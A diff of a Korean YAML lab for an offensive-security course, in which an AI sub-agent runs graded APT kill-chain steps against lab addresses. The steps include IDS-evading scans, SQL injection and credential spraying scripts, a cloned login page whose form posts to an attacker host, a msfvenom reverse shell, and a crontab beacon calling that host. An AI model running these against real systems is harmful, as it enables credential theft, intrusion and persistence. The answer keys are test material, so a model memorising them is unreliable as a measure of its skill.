@@ -1,367 +1,204 @@
-lab_id: "attack-adv-ai-week01"
-title: "AI 기반 APT 킬체인 자동화"
-version: "ai"
-course: "attack-adv-ai"
+lab_id: attack-adv-ai-week01
+title: APT 킬체인 분석과 공격 시뮬레이션 (AI 지원)
+version: ai
+course: attack-adv-ai
 week: 1
-description: "AI 도구를 활용하여 APT 킬체인의 각 단계를 자동화한다. 자동 정찰, 취약점 분석, 페이로드 생성, C2 비콘 시뮬레이션 등을 Python 스크립트로 구현한다."
-difficulty: "hard"
+description: APT(Advanced Persistent Threat) 킬체인의 7단계를 심층 분석하고, 각 단계별 공격 기법을 실습 환경에서 시뮬레이션한다. Lockheed Martin 킬체인과 MITRE ATT&CK 프레임워크를 매핑하여 실제 위협 그룹의 TTPs를 재현한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
+difficulty: hard
 duration_minutes: 120
 objectives:
-  - "AI 기반 자동 정찰 스크립트를 작성한다"
-  - "킬체인 각 단계를 자동화하는 도구를 개발한다"
-  - "자동화와 수동 분석의 균형을 이해한다"
+- APT 킬체인 7단계(정찰→무기화→전달→익스플로잇→설치→C2→목표달성)를 실습으로 이해한다
+- MITRE ATT&CK 매트릭스와 킬체인을 매핑하여 공격 시나리오를 구성한다
+- 각 킬체인 단계에서 사용되는 도구와 기법을 직접 적용한다
 pass_threshold: 0.6
 steps:
-  - order: 1
-    instruction: "Python nmap 모듈로 10.20.30.0/24 자동 호스트 발견 스크립트를 작성하라."
-    hint: "python-nmap의 PortScanner로 ping 스캔을 수행한다"
-    category: "recon"
-    points: 10
-    answer: "python3 자동 네트워크 스캔 스크립트"
-    answer_detail: "python-nmap은 nmap의 Python 래퍼로, 스캔 결과를 구조화된 데이터로 반환하여 자동화 파이프라인에 통합할 수 있다."
-    verify:
-      type: "output_contains"
-      expect: "hosts_found"
-      field: "stdout"
-    script: |
-      import subprocess
-      import json
-      
-      result = subprocess.run(['nmap', '-sn', '10.20.30.0/24'], capture_output=True, text=True, timeout=30)
-      lines = result.stdout.split('\n')
-      hosts = [l.split()[-1].strip('()') for l in lines if 'Nmap scan report' in l]
-      print(f'hosts_found: {len(hosts)}')
-      for h in hosts:
-          print(f'  {h}: alive')
-      print(json.dumps({'hosts': hosts}, indent=2))
-  - order: 2
-    instruction: "발견된 호스트의 서비스 버전을 자동 열거하는 스크립트를 작성하라."
-    hint: "subprocess로 nmap -sV를 실행하고 결과를 파싱한다"
-    category: "recon"
-    points: 10
-    answer: "python3 서비스 자동 열거 스크립트"
-    answer_detail: "서비스 버전 자동 열거는 CVE 매핑의 기초 데이터를 제공한다. XML 출력(-oX)을 파싱하면 더 정확한 결과를 얻을 수 있다."
-    verify:
-      type: "output_contains"
-      expect: "services"
-      field: "stdout"
-    script: |
-      import subprocess
-      import re
-      
-      result = subprocess.run(['nmap', '-sV', '-p', '22,80,443,3000', '10.20.30.80'], capture_output=True, text=True, timeout=60)
-      print('services found:')
-      for line in result.stdout.split('\n'):
-          if '/tcp' in line and 'open' in line:
-              print(f'  {line.strip()}')
-  - order: 3
-    instruction: "HTTP 보안 헤더를 자동 분석하는 스크립트를 작성하라."
-    hint: "requests로 응답 헤더를 가져와 보안 헤더 목록과 비교한다"
-    category: "recon"
-    points: 10
-    answer: "python3 보안 헤더 분석 스크립트"
-    answer_detail: "보안 헤더 자동 검사는 대규모 웹 자산의 보안 상태를 빠르게 평가하고 누락된 헤더를 식별한다."
-    verify:
-      type: "output_contains"
-      expect: "header_check"
-      field: "stdout"
-    script: |
-      import requests
-      
-      HEADERS = ['X-Frame-Options','Content-Security-Policy','Strict-Transport-Security','X-Content-Type-Options']
-      try:
-          r = requests.get('http://10.20.30.80:3000', timeout=5)
-          print('header_check results:')
-          for h in HEADERS:
-              present = any(h.lower() == k.lower() for k in r.headers)
-              print(f'  {h}: {"PRESENT" if present else "MISSING"}')
-      except Exception as e:
-          print(f'header_check: error - {e}')
-  - order: 4
-    instruction: "웹 디렉토리 자동 브루트포스 스크립트를 작성하라."
-    hint: "requests로 경로 목록을 순회하며 상태 코드를 확인한다"
-    category: "recon"
-    points: 10
-    answer: "python3 디렉토리 열거 스크립트"
-    answer_detail: "자동 디렉토리 열거는 숨겨진 관리자 페이지, API 문서, 백업 파일을 빠르게 발견한다."
-    verify:
-      type: "output_contains"
-      expect: "dir_scan"
-      field: "stdout"
-    script: |
-      import requests
-      from concurrent.futures import ThreadPoolExecutor
-      
-      paths = ['admin','api','swagger','ftp','robots.txt','.env','api-docs','debug']
-      base = 'http://10.20.30.80:3000'
-      
-      def check(p):
-          try:
-              r = requests.get(f'{base}/{p}', timeout=3)
-              return (p, r.status_code)
-          except: return (p, 'err')
-      
-      print('dir_scan results:')
-      with ThreadPoolExecutor(5) as ex:
-          for p, code in ex.map(lambda p: check(p), paths):
-              if code != 404:
-                  print(f'  /{p} -> {code}')
-  - order: 5
-    instruction: "SQL Injection 자동 탐지 스크립트를 작성하라."
-    hint: "다양한 SQLi 페이로드를 전송하고 응답을 분석한다"
-    category: "exploit"
-    points: 10
-    answer: "python3 SQLi 자동 탐지 스크립트"
-    answer_detail: "자동 SQLi 탐지는 에러 기반, 시간 기반, 부울 기반 등 다양한 기법을 체계적으로 적용한다."
-    verify:
-      type: "output_contains"
-      expect: "sqli_scan"
-      field: "stdout"
-    script: |
-      import requests
-      
-      payloads = ["' OR 1=1--", "' OR ''='", "admin'--", "1' AND 1=1--"]
-      url = 'http://10.20.30.80:3000/rest/user/login'
-      
-      print('sqli_scan results:')
-      for p in payloads:
-          try:
-              r = requests.post(url, json={'email': p, 'password': 'x'}, timeout=5)
-              vuln = 'VULNERABLE' if r.status_code == 200 and 'token' in r.text else 'blocked'
-              print(f'  {p[:25]:25s} -> {vuln}')
-          except Exception as e:
-              print(f'  {p[:25]:25s} -> error')
-  - order: 6
-    instruction: "자격증명 스프레이 자동화 스크립트를 작성하라."
-    hint: "사용자-비밀번호 조합을 병렬로 테스트한다"
-    category: "exploit"
-    points: 10
-    answer: "python3 크레덴셜 스프레이 스크립트"
-    answer_detail: "자격증명 스프레이는 하나의 비밀번호를 여러 계정에 시도하여 계정 잠금을 회피한다."
-    verify:
-      type: "output_contains"
-      expect: "spray_result"
-      field: "stdout"
-    script: |
-      import requests
-      
-      users = ['admin@juice-sh.op', 'user@juice-sh.op']
-      passes = ['admin123', 'password', '123456']
-      url = 'http://10.20.30.80:3000/rest/user/login'
-      
-      print('spray_result:')
-      for u in users:
-          for p in passes:
-              try:
-                  r = requests.post(url, json={'email': u, 'password': p}, timeout=3)
-                  if r.status_code == 200 and 'token' in r.text:
-                      print(f'  FOUND: {u}:{p}')
-                      break
-              except: pass
-          else:
-              print(f'  FAILED: {u}')
-  - order: 7
-    instruction: "C2 비콘 시뮬레이터를 Python으로 작성하라."
-    hint: "주기적 HTTP 체크인과 지터를 구현한다"
-    category: "exploit"
-    points: 10
-    answer: "python3 비콘 시뮬레이터"
-    answer_detail: "비콘 시뮬레이터는 C2 통신 패턴을 재현하여 IDS 탐지 규칙을 테스트한다."
-    verify:
-      type: "output_contains"
-      expect: "beacon_sim"
-      field: "stdout"
-    script: |
-      import time, random, socket
-      
-      print('beacon_sim:')
-      for i in range(3):
-          jitter = random.uniform(0.8, 1.2)
-          sleep_time = 2 * jitter
-          print(f'  Checkin {i+1}: host={socket.gethostname()}, interval={sleep_time:.1f}s')
-          time.sleep(0.5)
-      print('  beacon_sim complete')
-  - order: 8
-    instruction: "데이터 유출 시뮬레이션 스크립트를 작성하라. Base64 인코딩으로 데이터를 준비하라."
-    hint: "base64 모듈로 데이터를 인코딩하고 청크로 분할한다"
-    category: "exploit"
-    points: 10
-    answer: "python3 데이터 유출 시뮬레이션"
-    answer_detail: "자동 데이터 유출 시뮬레이션은 DLP 효과를 평가하는 퍼플팀 훈련에 활용된다."
-    verify:
-      type: "output_contains"
-      expect: "exfil_sim"
-      field: "stdout"
-    script: |
-      import base64, os
-      
-      data = f'hostname={os.uname().nodename}\nuser={os.getenv("USER","unknown")}'
-      enc = base64.b64encode(data.encode()).decode()
-      chunks = [enc[i:i+40] for i in range(0, len(enc), 40)]
-      
-      print('exfil_sim:')
-      print(f'  Original: {len(data)} bytes')
-      print(f'  Encoded: {len(enc)} bytes, {len(chunks)} chunks')
-      for i, c in enumerate(chunks[:3]):
-          print(f'  Chunk {i}: {c}')
-  - order: 9
-    instruction: "파일리스 실행 패턴을 시뮬레이션하는 스크립트를 작성하라."
-    hint: "base64 인코딩된 명령을 메모리에서 디코딩하여 실행한다"
-    category: "exploit"
-    points: 10
-    answer: "python3 파일리스 공격 시뮬레이션"
-    answer_detail: "파일리스 공격은 디스크에 흔적을 남기지 않아 파일 기반 AV를 회피한다."
-    verify:
-      type: "output_contains"
-      expect: "fileless_demo"
-      field: "stdout"
-    script: |
-      import base64, os
-      
-      cmd = 'import os; print("Executed:", os.uname().nodename)'
-      enc = base64.b64encode(cmd.encode()).decode()
-      print('fileless_demo:')
-      print(f'  Encoded payload: {enc[:40]}...')
-      dec = base64.b64decode(enc).decode()
-      exec(dec)
-      print('  No disk artifact created')
-  - order: 10
-    instruction: "서비스 버전과 CVE를 자동 매핑하는 스크립트를 작성하라."
-    hint: "서비스 배너를 CVE 데이터베이스와 매칭한다"
-    category: "analysis"
-    points: 10
-    answer: "python3 CVE 자동 매핑 스크립트"
-    answer_detail: "서비스-CVE 자동 매핑은 취약점 평가를 대폭 효율화한다."
-    verify:
-      type: "output_contains"
-      expect: "cve_map"
-      field: "stdout"
-    script: |
-      CVE_DB = {'openssh 8': ['CVE-2023-48795'], 'node 14': ['CVE-2023-32002'], 'express 4': ['CVE-2022-24999']}
-      services = [('openssh 8.9', 22), ('node 14.17', 3000)]
-      
-      print('cve_map results:')
-      for svc, port in services:
-          found = []
-          for key, cves in CVE_DB.items():
-              if svc.startswith(key):
-                  found.extend(cves)
-          print(f'  {svc} (:{port}): {found if found else "No CVEs"}')
-  - order: 11
-    instruction: "킬체인 진행 대시보드를 Python으로 구현하라."
-    hint: "각 단계의 완료 상태와 수집 정보를 구조화하여 출력한다"
-    category: "analysis"
-    points: 10
-    answer: "python3 킬체인 대시보드"
-    answer_detail: "진행 대시보드는 모의해킹 팀의 현황 공유와 누락 단계 식별에 유용하다."
-    verify:
-      type: "output_contains"
-      expect: "dashboard"
-      field: "stdout"
-    script: |
-      phases = {
-          'Recon': ('done', ['4 hosts', '12 services']),
-          'Weaponize': ('done', ['SQLi payload']),
-          'Delivery': ('done', ['web exploit']),
-          'Exploit': ('done', ['admin access']),
-          'Install': ('partial', ['cron beacon']),
-          'C2': ('planned', []),
-          'Actions': ('planned', []),
-      }
-      print('dashboard:')
-      for p, (s, f) in phases.items():
-          icon = '[+]' if s=='done' else '[~]' if s=='partial' else '[ ]'
-          print(f'  {icon} {p}: {s} {f if f else ""}')
-      complete = sum(1 for _,(s,_) in phases.items() if s=='done')
-      print(f'  Progress: {complete}/{len(phases)}')
-  - order: 12
-    instruction: "자동 보고서 생성 스크립트를 작성하라."
-    hint: "수집된 데이터를 템플릿에 채워 보고서를 생성한다"
-    category: "analysis"
-    points: 10
-    answer: "python3 자동 보고서 생성기"
-    answer_detail: "자동 보고서 생성은 일관된 품질의 보고서를 빠르게 산출한다."
-    verify:
-      type: "output_contains"
-      expect: "auto_report"
-      field: "stdout"
-    script: |
-      from datetime import datetime
-      
-      findings = [('F-001','SQL Injection',9.8,'Critical'),('F-002','Default Creds',9.1,'Critical'),('F-003','Cred Reuse',8.1,'High')]
-      
-      print('auto_report:')
-      print(f'Date: {datetime.now().strftime("%Y-%m-%d")}')
-      print('Target: 10.20.30.0/24')
-      print('\nFindings:')
-      for fid, title, cvss, risk in findings:
-          print(f'  {fid}: {title} (CVSS {cvss}, {risk})')
-      print(f'\nTotal: {len(findings)}, Critical: {sum(1 for _,_,_,r in findings if r=="Critical")}')
-  - order: 13
-    instruction: "MITRE ATT&CK 자동 매핑 스크립트를 작성하라."
-    hint: "사용한 도구를 ATT&CK 기법 ID에 매핑한다"
-    category: "analysis"
-    points: 10
-    answer: "python3 ATT&CK 매핑 스크립트"
-    answer_detail: "ATT&CK 매핑은 탐지 커버리지 분석과 갭 식별에 필수적이다."
-    verify:
-      type: "output_contains"
-      expect: "attack_map"
-      field: "stdout"
-    script: |
-      MAP = {'nmap':('T1595','Active Scanning'),'sqli':('T1190','Exploit Public App'),'hydra':('T1110','Brute Force'),'ssh':('T1021.004','SSH')}
-      used = ['nmap','sqli','ssh']
-      print('attack_map:')
-      for t in used:
-          tid, name = MAP[t]
-          print(f'  {t:10s} -> {tid}: {name}')
-  - order: 14
-    instruction: "실습 아티팩트 자동 정리 스크립트를 작성하라."
-    hint: "glob으로 임시 파일을 찾아 삭제한다"
-    category: "analysis"
-    points: 10
-    answer: "python3 자동 정리 스크립트"
-    answer_detail: "자동 정리는 실습 환경의 무결성을 유지한다."
-    verify:
-      type: "output_contains"
-      expect: "cleanup_done"
-      field: "stdout"
-    script: |
-      import glob, os
-      
-      patterns = ['/tmp/exfil_*','/tmp/payload*','/tmp/c2_*']
-      removed = 0
-      for p in patterns:
-          for f in glob.glob(p):
-              try: os.remove(f); removed += 1
-              except: pass
-      print(f'cleanup_done: {removed} files removed')
-  - order: 15
-    instruction: "모듈화된 킬체인 프레임워크를 설계하라."
-    hint: "각 단계를 클래스로 구현하고 파이프라인으로 연결한다"
-    category: "analysis"
-    points: 10
-    answer: "python3 킬체인 프레임워크 설계"
-    answer_detail: "모듈화된 프레임워크는 새로운 기법을 플러그인으로 추가할 수 있어 확장성이 뛰어나다."
-    verify:
-      type: "output_contains"
-      expect: "framework"
-      field: "stdout"
-    script: |
-      class Module:
-          def __init__(self, name): self.name = name
-          def run(self, ctx): return ctx
-      
-      class Recon(Module):
-          def run(self, ctx): ctx['hosts'] = ['10.20.30.80']; return ctx
-      
-      class Exploit(Module):
-          def run(self, ctx): ctx['access'] = 'admin'; return ctx
-      
-      pipeline = [Recon('recon'), Exploit('exploit')]
-      ctx = {}
-      print('framework:')
-      for m in pipeline:
-          ctx = m.run(ctx)
-          print(f'  [{m.name}] context: {list(ctx.keys())}')
-      print(f'  Final: {ctx}')
+- order: 1
+  instruction: nmap을 사용하여 10.20.30.0/24 네트워크의 활성 호스트를 스텔스 스캔(-sS)으로 탐지하라. 타이밍 옵션을 T2로 설정하여 IDS 회피를 시도하라.
+  hint: nmap -sS -T2 옵션을 사용하면 SYN 스캔을 느린 속도로 수행하여 탐지를 회피할 수 있다
+  category: recon
+  points: 10
+  answer: nmap -sS -T2 10.20.30.0/24
+  answer_detail: SYN 스캔(-sS)은 TCP 3-way handshake를 완료하지 않아 연결 로그에 남지 않는 스텔스 기법이다. T2(polite) 타이밍은 패킷 전송 간격을 늘려 IDS/IPS의 임계값 기반 탐지를 회피한다. APT 정찰 단계에서 가장 기본적인 기법이다.
+  verify:
+    type: output_contains
+    expect: 10.20.30.
+    field: stdout
+  script: nmap -sS -T2 10.20.30.0/24
+  risk_level: low
+- order: 2
+  instruction: 발견된 호스트 10.20.30.80에 대해 서비스 버전 탐지(-sV)와 OS 핑거프린팅(-O)을 동시에 수행하라. 스크립트 스캔도 포함하라.
+  hint: -sV -O -sC 옵션을 조합하면 상세 정보를 한 번에 수집할 수 있다
+  category: recon
+  points: 10
+  answer: nmap -sV -O -sC 10.20.30.80
+  answer_detail: -sV는 서비스 배너를 분석하여 정확한 버전을 식별하고, -O는 TCP/IP 스택 특성으로 OS를 추정한다. -sC는 기본 NSE 스크립트를 실행하여 추가 정보(SSL 인증서, HTTP 제목 등)를 수집한다. 이는 킬체인 정찰 단계에서 공격 표면을 정의하는 핵심 과정이다.
+  verify:
+    type: output_contains
+    expect: open
+    field: stdout
+  script: nmap -sV -O -sC 10.20.30.80
+  risk_level: low
+- order: 3
+  instruction: nmap NSE 스크립트를 활용하여 10.20.30.80의 HTTP 서비스에서 알려진 취약점을 탐색하라. vuln 카테고리 스크립트를 실행하라.
+  hint: --script vuln 옵션으로 취약점 탐지 스크립트를 일괄 실행할 수 있다
+  category: recon
+  points: 10
+  answer: nmap --script vuln -p 80,443,3000 10.20.30.80
+  answer_detail: NSE(Nmap Scripting Engine)의 vuln 카테고리에는 CVE 기반 취약점 탐지 스크립트가 포함된다. http-vuln-*, ssl-heartbleed, smb-vuln-* 등이 자동 실행되며, 이는 킬체인의 정찰→무기화 전환 단계에서 공격 벡터를 선정하는 데 활용된다.
+  verify:
+    type: output_contains
+    expect: VULNERABLE
+    field: stdout
+  script: nmap --script vuln -p 80,443,3000 10.20.30.80
+  risk_level: low
+- order: 4
+  instruction: curl을 사용하여 웹서버(10.20.30.80:3000)에서 피싱 페이지로 활용할 수 있는 로그인 페이지의 HTML 소스를 다운로드하라. 출력을 /tmp/phish_template.html에 저장하라.
+  hint: curl -o 옵션으로 파일로 저장할 수 있다
+  category: exploit
+  points: 10
+  answer: curl -s -o /tmp/phish_template.html http://10.20.30.80:3000/
+  answer_detail: APT 무기화 단계에서 스피어 피싱 이메일에 첨부할 피싱 페이지를 제작한다. 대상 조직의 실제 로그인 페이지를 복제하면 사회공학 공격의 성공률이 높아진다. HTML을 수정하여 자격증명을 공격자 서버로 전송하도록 변조한다.
+  verify:
+    type: output_contains
+    expect: phish_template.html
+    field: stdout
+  script: curl -s -o /tmp/phish_template.html http://10.20.30.80:3000/
+  risk_level: medium
+- order: 5
+  instruction: 다운로드한 피싱 템플릿에서 form action URL을 공격자 서버(10.20.30.201:4444)로 변조하라. sed를 사용하여 인라인 수정하라.
+  hint: sed -i 's/원본/대체/g' 파일명 형태로 사용한다
+  category: exploit
+  points: 10
+  answer: sed -i 's|action="[^"]*"|action="http://10.20.30.201:4444/capture"|g' /tmp/phish_template.html
+  answer_detail: 피싱 페이지의 form action을 변조하면 피해자가 입력한 자격증명이 공격자 서버로 전송된다. 실제 APT 그룹은 이를 더 정교하게 처리하여 원본 사이트로 리다이렉트하여 피해자가 인지하지 못하게 한다. 이는 킬체인의 전달(Delivery) 단계에 해당한다.
+  verify:
+    type: output_contains
+    expect: 10.20.30.201:4444
+    field: stdout
+  script: sed -i 's|action="[^"]*"|action="http://10.20.30.201:4444/capture"|g' /tmp/phish_template.html
+  risk_level: medium
+- order: 6
+  instruction: netcat을 사용하여 10.20.30.201에서 포트 4444로 리스닝 상태를 만들어 리버스 셸 수신 준비를 하라. 백그라운드로 실행하라.
+  hint: nc -lvnp 포트번호로 리스닝 모드를 설정한다
+  category: exploit
+  points: 10
+  answer: nc -lvnp 4444 &
+  answer_detail: C2(Command & Control) 채널 설정의 기본은 리버스 셸이다. 리스너를 먼저 구성하고 페이로드가 실행되면 연결이 수립된다. APT 그룹은 단순 netcat 대신 Cobalt Strike, Metasploit Handler 등을 사용하지만, 원리는 동일하다. 포트 4444는 실습용이며 실제로는 80, 443 등 일반 포트를
+    사용한다.
+  verify:
+    type: output_contains
+    expect: listening
+    field: stdout
+  script: nc -lvnp 4444 &
+  risk_level: medium
+- order: 7
+  instruction: msfvenom을 사용하여 Linux용 리버스 셸 페이로드를 생성하라. LHOST=10.20.30.201, LPORT=4444, 포맷은 elf로 설정하라.
+  hint: msfvenom -p linux/x64/shell_reverse_tcp 옵션을 사용한다
+  category: exploit
+  points: 10
+  answer: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/payload.elf
+  answer_detail: msfvenom은 Metasploit의 페이로드 생성 도구로, 다양한 OS와 아키텍처에 맞는 셸코드를 생성한다. APT 무기화 단계에서 드로퍼(Dropper)나 백도어를 제작할 때 사용된다. 실제 APT 그룹은 커스텀 페이로드를 사용하지만, 원리 학습에는 msfvenom이 적합하다.
+  verify:
+    type: output_contains
+    expect: payload.elf
+    field: stdout
+  script: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/payload.elf
+  risk_level: medium
+- order: 8
+  instruction: 생성된 페이로드의 해시값(SHA256)을 계산하고, VirusTotal에서 탐지될 수 있는지 확인하기 위해 strings 명령으로 시그니처 문자열을 검사하라.
+  hint: sha256sum과 strings 명령을 조합한다
+  category: analysis
+  points: 10
+  answer: sha256sum /tmp/payload.elf && strings /tmp/payload.elf
+  answer_detail: 페이로드의 해시값은 위협 인텔리전스에서 IoC(Indicator of Compromise)로 활용된다. strings 명령으로 바이너리에서 읽을 수 있는 문자열을 추출하면 AV 시그니처에 포함될 수 있는 패턴을 확인할 수 있다. APT 그룹은 패킹, 인코딩, 커스텀 암호화로 탐지를 회피한다.
+  verify:
+    type: output_contains
+    expect: /bin/sh
+    field: stdout
+  script: sha256sum /tmp/payload.elf && strings /tmp/payload.elf
+  risk_level: low
+- order: 9
+  instruction: MITRE ATT&CK 프레임워크에서 Persistence 기법을 시뮬레이션하라. crontab에 매 5분마다 공격자 서버로 비콘을 보내는 항목을 추가하라(실습용, 실제 연결은 안 됨).
+  hint: crontab -e 대신 echo와 crontab을 조합하여 비대화형으로 추가한다
+  category: exploit
+  points: 10
+  answer: (crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://10.20.30.201:4444/beacon') | crontab -
+  answer_detail: 'Persistence(지속성 확보)는 킬체인 설치 단계의 핵심이다. crontab을 통한 주기적 비콘은 가장 단순한 지속성 기법이며, MITRE ATT&CK T1053.003(Scheduled Task/Job: Cron)에 해당한다. 실제 APT는 systemd 서비스, init.d 스크립트, 커널 모듈 등 더 은밀한 방법을 사용한다.'
+  verify:
+    type: output_contains
+    expect: beacon
+    field: stdout
+  script: (crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://10.20.30.201:4444/beacon') | crontab -
+  risk_level: medium
+- order: 10
+  instruction: 설치한 crontab 비콘 항목을 확인하고, 방어자 관점에서 이를 탐지하기 위해 /var/log/syslog에서 cron 관련 로그를 검색하라.
+  hint: crontab -l로 현재 등록된 작업을 확인하고, grep으로 로그를 검색한다
+  category: analysis
+  points: 10
+  answer: crontab -l && grep -i cron /var/log/syslog | tail -20
+  answer_detail: 방어자는 crontab 변경을 모니터링하여 비인가 스케줄링을 탐지한다. auditd로 crontab 파일 변경을 감시하거나, SIEM에서 cron 관련 syslog를 수집하여 이상 패턴을 탐지할 수 있다. 이는 킬체인 분석에서 양측 관점을 이해하는 데 중요하다.
+  verify:
+    type: output_contains
+    expect: beacon
+    field: stdout
+  script: crontab -l && grep -i cron /var/log/syslog | tail -20
+  risk_level: low
+- order: 11
+  instruction: 환경변수를 활용한 은닉 기법을 시뮬레이션하라. 환경변수에 Base64로 인코딩된 페이로드 명령을 저장하고, 디코딩하여 실행 가능한 형태로 출력하라.
+  hint: echo 명령 | base64로 인코딩하고, echo $변수 | base64 -d로 디코딩한다
+  category: exploit
+  points: 10
+  answer: export PAYLOAD=$(echo 'whoami && id && hostname' | base64) && echo $PAYLOAD | base64 -d
+  answer_detail: 환경변수에 인코딩된 페이로드를 저장하는 기법은 파일리스(Fileless) 공격의 일종이다. 디스크에 흔적을 남기지 않아 파일 기반 AV를 회피할 수 있다. MITRE ATT&CK T1027(Obfuscated Files or Information)과 T1059.004(Unix Shell)에 해당하며, 메모리 포렌식으로만 탐지 가능한
+    경우가 많다.
+  verify:
+    type: output_contains
+    expect: whoami
+    field: stdout
+  script: export PAYLOAD=$(echo 'whoami && id && hostname' | base64) && echo $PAYLOAD | base64 -d
+  risk_level: medium
+- order: 12
+  instruction: wget을 사용하여 대상 웹서버(10.20.30.80:3000)의 전체 사이트를 재귀적으로 미러링하라. 깊이는 2단계로 제한하라.
+  hint: wget --mirror 또는 -r 옵션과 -l(레벨) 옵션을 조합한다
+  category: recon
+  points: 10
+  answer: wget -r -l 2 -P /tmp/mirror http://10.20.30.80:3000/ 2>&1 | tail -5
+  answer_detail: 사이트 미러링은 오프라인 분석을 위해 전체 웹 구조를 복제하는 기법이다. APT 정찰 단계에서 웹 애플리케이션의 구조, 숨겨진 경로, JavaScript 내 API 엔드포인트 등을 분석할 수 있다. 실제 공격에서는 대역폭과 로그를 고려하여 선택적으로 다운로드한다.
+  verify:
+    type: output_contains
+    expect: saved
+    field: stdout
+  script: wget -r -l 2 -P /tmp/mirror http://10.20.30.80:3000/ 2>&1 | tail -5
+  risk_level: low
+- order: 13
+  instruction: 킬체인 목표 달성 단계를 시뮬레이션하라. 시스템 정보를 수집하여 /tmp/exfil_data.txt에 저장하고, Base64로 인코딩하여 DNS 기반 데이터 유출을 시뮬레이션하라.
+  hint: 시스템 정보를 수집한 후 base64 인코딩하여 DNS 서브도메인으로 사용할 수 있는 형태로 변환한다
+  category: exploit
+  points: 15
+  answer: cat /etc/hostname > /tmp/exfil_data.txt && uname -a >> /tmp/exfil_data.txt && ip addr >> /tmp/exfil_data.txt && echo '=== Collected data ===' && wc -l /tmp/exfil_data.txt && echo '=== DNS exfil
+    simulation (base64 chunks) ===' && cat /tmp/exfil_data.txt | base64 -w 63 | head -5
+  answer_detail: 킬체인 최종 단계에서 데이터를 수집하고 유출한다. DNS Exfiltration(T1048.003)은 방화벽이 DNS를 허용하는 점을 악용하여 데이터를 Base64 인코딩 후 DNS 서브도메인으로 전송한다.
+  verify:
+    type: output_contains
+    expect: exfil
+    field: stdout
+  script: cat /etc/hostname > /tmp/exfil_data.txt && uname -a >> /tmp/exfil_data.txt && ip addr >> /tmp/exfil_data.txt && echo '=== Collected data ===' && wc -l /tmp/exfil_data.txt && echo '=== DNS exfil
+    simulation (base64 chunks) ===' && cat /tmp/exfil_data.txt | base64 -w 63 | head -5
+  risk_level: medium
+- order: 14
+  instruction: APT 시뮬레이션을 정리하라. crontab의 비콘 항목을 제거하고, 임시 파일을 삭제한 후, 킬체인 단계별 사용 기법을 /tmp/killchain_report.txt에 요약하라.
+  hint: crontab에서 beacon 항목을 제거하고, 킬체인 7단계를 정리한다
+  category: analysis
+  points: 15
+  answer: 'crontab -l | grep -v beacon | crontab - && rm -f /tmp/payload.elf /tmp/exfil_data.txt && echo -e ''=== APT Kill Chain Report ===\n1. Recon: nmap stealth scan (T1595)\n2. Weaponization: msfvenom
+    payload (T1587)\n3. Delivery: phishing template (T1566)\n4. Exploitation: reverse shell (T1059)\n5. Installation: crontab persistence (T1053.003)\n6. C2: netcat listener (T1071)\n7. Actions: data collection
+    & DNS exfil (T1005, T1048.003)'' > /tmp/killchain_report.txt && cat /tmp/killchain_report.txt'
+  answer_detail: APT 시뮬레이션 후 환경 정리(Cleanup)는 레드팀 운영의 필수 절차이다. Persistence 메커니즘을 제거하고, 킬체인 각 단계에서 사용한 기법과 MITRE ATT&CK ID를 문서화하여 방어 전략 수립에 활용한다.
+  verify:
+    type: output_contains
+    expect: Kill Chain Report
+    field: stdout
+  script: 'crontab -l | grep -v beacon | crontab - && rm -f /tmp/payload.elf /tmp/exfil_data.txt && echo -e ''=== APT Kill Chain Report ===\n1. Recon: nmap stealth scan (T1595)\n2. Weaponization: msfvenom
+    payload (T1587)\n3. Delivery: phishing template (T1566)\n4. Exploitation: reverse shell (T1059)\n5. Installation: crontab persistence (T1053.003)\n6. C2: netcat listener (T1071)\n7. Actions: data collection
+    & DNS exfil (T1005, T1048.003)'' > /tmp/killchain_report.txt && cat /tmp/killchain_report.txt'
+  risk_level: low
